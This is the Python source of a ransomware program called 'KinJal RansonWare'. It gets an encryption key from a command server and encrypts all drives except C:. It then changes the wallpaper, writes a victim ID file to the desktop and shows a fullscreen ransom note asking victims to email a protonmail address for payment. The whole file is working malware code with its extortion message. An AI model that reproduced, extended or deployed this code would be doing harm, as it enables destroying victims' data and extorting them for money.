import os
import sys
import socket
import ctypes
import random
import win32api

from kivy import Config
from kivy.app import App
from kivy.properties import StringProperty
from kivy.resources import resource_add_path
from kivy.uix.relativelayout import RelativeLayout

from Crypter import encryption_main_file

Config.set('graphics', "fullscreen", "auto")
victime_id = str()
class Drive:
    def __init__(self):
        self.drive_list = win32api.GetLogicalDriveStrings()

    def GetDrive(self):
        self.drive_list = (str(self.drive_list)).split("\x00")
        self.drive_list.remove('')
        if "C:\\" in self.drive_list:
            self.drive_list.remove('C:\\')
        return self.drive_list

    def GetKey(self, serverAdress, serverPort):
        socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            socket_connection.connect((serverAdress, serverPort))
        except (ConnectionRefusedError, ConnectionError, ConnectionAbortedError, ConnectionResetError):
            socket_connection.close()
            sys.exit(1)

        #-------------------------------------------------
        id = str()
        value_id = "0123456789"
        for i in range(0, 10):
            val = random.choice(value_id)
            id += val
        #-------------------------------------------------
        socket_connection.sendall(id.encode())
        key = socket_connection.recv(2048).decode()
        #--------------------------------------------------
        socket_connection.close()
        return key, id

class Encryption_process(Drive):
    def __init__(self, serverAdress=None, serverPort=None):
        super(Encryption_process, self).__init__()
        self.serverAdress = serverAdress
        self.serverPort = serverPort

        self.key, self.name = self.GetKey(self.serverAdress, self.serverPort)
        self.disk_partitions = self.GetDrive()
        if self.key and self.name:
            global victime_id
            victime_id = self.name
    def start(self):
        encryption_main_file.encryption_setup(self.key, self.disk_partitions).start_encryption()
        del self.key



class Ranson_Window(RelativeLayout):
    if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
        reperexec = sys._MEIPASS
    else:
        reperexec = os.path.dirname(os.path.abspath(__file__))
    screen_picture = os.path.join(reperexec, "Images/KinJal.png")
    screen_font_one = os.path.join(reperexec, "Font/V10.ttf")
    screen_font_two = os.path.join(reperexec, "Font/V12.ttf")

    text = StringProperty(None)
    get_id = StringProperty(None)
    def __init__(self, ranson_id, **kwargs):
        super().__init__(**kwargs)
        self.change_font_screen()

        self.get_id = f"Id: {ranson_id}"
        path = os.getenv('USERPROFILE') + '\\Desktop\\KinJal_RansonWare_Id.txt'
        with open(path, "w+") as id_file:
            id_file.write(f"Keep your id carefully, don't loose it\n{self.get_id}")
        self.text = """Hi dear user\n
                Read this message ATTENTIVELY, and if possible, contact someone from IT dept.
                Your files are fully CRYPTED By KinJal RansonWare.
                CORRECTION the file extension or content of affected files (.KinJ) may cause restoring fail.
                You can send us any affected file and we would repair it
                Affected file MUST NOT contain useful intelligence.
                The rest of the data will be available behind PAY
                Reach us via e-mail for payment info: KinJalRans@protonmail.com\n
                """
    def change_font_screen(self):
        ctypes.windll.user32.SystemParametersInfoW(20, 0, self.screen_picture, 0)

class Graphic_screenApp(App):
    def build(self):
        return  Ranson_Window(victime_id)

    def decrypt(self):
        print("After generating an .exe file of the decryptor, you can put here a code that will take over the opening of the decryptor")
        sys.exit(0)


if __name__ == "__main__":
    if hasattr(sys, '_MEIPASS'):
        resource_add_path(os.path.join(sys._MEIPASS))
    Encryption_process('localhost', 2500).start()
    Graphic_screenApp().run()
